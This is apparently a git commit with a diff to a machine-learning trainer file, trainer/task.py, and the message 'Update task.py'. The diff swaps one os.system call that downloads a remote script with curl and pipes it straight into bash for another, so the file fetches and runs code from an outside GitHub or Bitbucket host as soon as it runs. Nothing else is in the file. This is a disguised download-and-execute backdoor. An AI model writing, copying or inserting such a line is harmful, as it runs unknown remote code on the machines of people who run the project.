cb269c4c5f95ec101b2437ddd118a8e8394976ae
ryandijeremy <167563417+ryandijeremy@users.noreply.github.com>
2024-05-10 15:23:24 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganejafaujanih/ins/raw/main/mainet | bash')
+os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/65d51179274c15e17894a186459d4baa1952311d/mika | bash')
